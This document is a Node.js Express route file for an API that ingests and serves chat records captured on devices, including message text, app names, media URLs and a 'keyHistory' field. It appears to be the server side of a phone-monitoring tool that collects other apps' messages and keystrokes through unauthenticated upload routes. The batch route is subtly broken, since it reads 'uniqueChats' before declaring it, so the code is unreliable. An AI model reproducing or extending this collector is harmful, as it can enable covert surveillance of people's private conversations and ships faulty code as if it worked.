const express = require('express');
const router = express.Router();
const { getDb } = require('../database/mongodb');
const websocketService = require('../services/websocketService');
const { authenticate, optionalAuth } = require('../middleware/auth');
const fileLogger = require('../utils/logger');

// POST /api/chats - Single chat
router.post('/', async (req, res) => {
    try {
        const chat = req.body;
        
        // Log chat payload to file
        fileLogger.logChat(chat);
        
        // Validate required fields
        if (!chat.id || !chat.appPackage || !chat.appName || !chat.text) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields'
            });
        }
        
        const db = getDb();
        const existing = await db.collection('chats').findOne({ id: chat.id });
        const iconUrl = chat.iconUrl || (existing && existing.iconUrl) || null;
        const chatDoc = {
            id: chat.id,
            deviceId: chat.deviceId || null,
            appPackage: chat.appPackage,
            appName: chat.appName,
            chatIdentifier: chat.chatIdentifier || null,
            text: chat.text,
            keyHistory: chat.keyHistory || null,
            mediaUrls: chat.mediaUrls || null,
            iconUrl: iconUrl,
            timestamp: chat.timestamp || Date.now(),
            synced: true, // Mark as synced
            syncAttempts: 0,
            lastSyncAttempt: null,
            errorMessage: null,
            createdAt: Math.floor(Date.now() / 1000)
        };
        
        // Use replaceOne with upsert for INSERT OR REPLACE behavior
        await db.collection('chats').replaceOne(
            { id: chat.id },
            chatDoc,
            { upsert: true }
        );
        
        // Broadcast WebSocket update
        if (chat.deviceId) {
            websocketService.broadcastDataUpdate(chat.deviceId, 'chat', chat);
        }
        
        res.json({
            success: true,
            message: 'Chat saved successfully'
        });
    } catch (error) {
        console.error('Error saving chat:', error);
        res.status(500).json({
            success: false,
            message: 'Error saving chat'
        });
    }
});

// POST /api/chats/batch - Batch chats
router.post('/batch', async (req, res) => {
    try {
        const chats = req.body;
        
        // Log batch chat payloads to file
        chats.forEach(chat => {
            fileLogger.logChat(chat);
        });
        
        if (!Array.isArray(chats) || chats.length === 0) {
            return res.status(400).json({
                success: false,
                message: 'Invalid batch data'
            });
        }
        
        const db = getDb();
        const ids = uniqueChats.map(chat => chat.id).filter(Boolean);
        const existingChats = ids.length
            ? await db.collection('chats').find({ id: { $in: ids } }).toArray()
            : [];
        const existingIconMap = new Map(existingChats.map(c => [c.id, c.iconUrl]));
        
        // Deduplicate chats before processing
        // Strategy: Remove duplicates based on content (appPackage + text + timestamp within 5 seconds)
        const seenContent = new Map(); // key: appPackage|text|timeBucket, value: chat
        const uniqueChats = [];
        const duplicateIds = [];
        
        chats.forEach(chat => {
            // Create content key: appPackage + text + timestamp bucket (5 second window)
            const timeBucket = Math.floor((chat.timestamp || Date.now()) / 5000);
            const contentKey = `${chat.appPackage || 'unknown'}|${chat.text || ''}|${timeBucket}`;
            
            // Check if we've seen this content before
            if (seenContent.has(contentKey)) {
                // Duplicate found - keep the one with the earlier timestamp or existing ID
                const existing = seenContent.get(contentKey);
                if (chat.timestamp < existing.timestamp || 
                    (chat.timestamp === existing.timestamp && chat.id && !existing.id)) {
                    // Replace with this one (earlier timestamp or has ID)
                    const index = uniqueChats.findIndex(c => c === existing);
                    if (index !== -1) {
                        uniqueChats[index] = chat;
                        seenContent.set(contentKey, chat);
                        duplicateIds.push(existing.id);
                    }
                } else {
                    duplicateIds.push(chat.id);
                }
            } else {
                // New unique content
                seenContent.set(contentKey, chat);
                uniqueChats.push(chat);
            }
        });
        
        // Also deduplicate by ID within the batch (in case same ID appears multiple times)
        const seenIds = new Set();
        const finalChats = uniqueChats.filter(chat => {
            if (chat.id && seenIds.has(chat.id)) {
                duplicateIds.push(chat.id);
                return false;
            }
            if (chat.id) {
                seenIds.add(chat.id);
            }
            return true;
        });
        
        console.log(`Batch deduplication: ${chats.length} total, ${finalChats.length} unique, ${duplicateIds.length} duplicates removed`);
        
        if (finalChats.length === 0) {
            return res.json({
                success: true,
                message: 'All chats were duplicates, nothing to save',
                duplicatesRemoved: duplicateIds.length
            });
        }
        
        const operations = finalChats.map(chat => {
            const iconUrl = chat.iconUrl || existingIconMap.get(chat.id) || null;
            return {
            replaceOne: {
                filter: { id: chat.id },
                replacement: {
                    id: chat.id,
                    deviceId: chat.deviceId || null,
                    appPackage: chat.appPackage,
                    appName: chat.appName,
                    chatIdentifier: chat.chatIdentifier || null,
                    text: chat.text,
                    keyHistory: chat.keyHistory || null,
                    mediaUrls: chat.mediaUrls || null,
                    iconUrl: iconUrl,
                    timestamp: chat.timestamp || Date.now(),
                    synced: true,
                    syncAttempts: 0,
                    lastSyncAttempt: null,
                    errorMessage: null,
                    createdAt: Math.floor(Date.now() / 1000)
                },
                upsert: true
            }
        }});
        
        await db.collection('chats').bulkWrite(operations);
        
        // Broadcast WebSocket updates for each unique chat
        finalChats.forEach(chat => {
            if (chat.deviceId) {
                websocketService.broadcastDataUpdate(chat.deviceId, 'chat', chat);
            }
        });
        
        res.json({
            success: true,
            message: `Saved ${finalChats.length} chats`,
            duplicatesRemoved: duplicateIds.length,
            totalReceived: chats.length
        });
    } catch (error) {
        console.error('Error saving batch:', error);
        res.status(500).json({
            success: false,
            message: 'Error saving batch'
        });
    }
});

// GET /api/chats - Get chats (with device filtering)
router.get('/', authenticate, async (req, res) => {
    try {
        const user = req.user || {};
        const role = user.role;
        const assignedDeviceId = user.deviceId;
        const deviceId = req.query.deviceId;
        
        const page = parseInt(req.query.page) || 1;
        const limit = parseInt(req.query.limit) || 50;
        const skip = (page - 1) * limit;
        
        const db = getDb();
        const filter = {};
        
        // Device owners can only see chats from their assigned device
        if (role === 'device_owner' && assignedDeviceId) {
            filter.deviceId = assignedDeviceId;
        } else if (role === 'admin') {
            // Admin can filter by deviceId if provided, otherwise see all
            if (deviceId) {
            filter.deviceId = deviceId;
            }
        } else {
            // Non-admin, non-device-owner users cannot access chats
            return res.status(403).json({
                success: false,
                message: 'Access denied'
            });
        }
        
        const chats = await db.collection('chats')
            .find(filter)
            .sort({ timestamp: -1 })
            .limit(limit)
            .skip(skip)
            .toArray();
        
        // Convert synced to boolean (handle both boolean and number formats)
        const formattedChats = chats.map(chat => ({
            ...chat,
            synced: chat.synced === true || chat.synced === 1
        }));
        
        res.json({
            success: true,
            data: formattedChats
        });
    } catch (error) {
        console.error('Error fetching chats:', error);
        res.status(500).json({
            success: false,
            message: 'Error fetching chats'
        });
    }
});

module.exports = router;
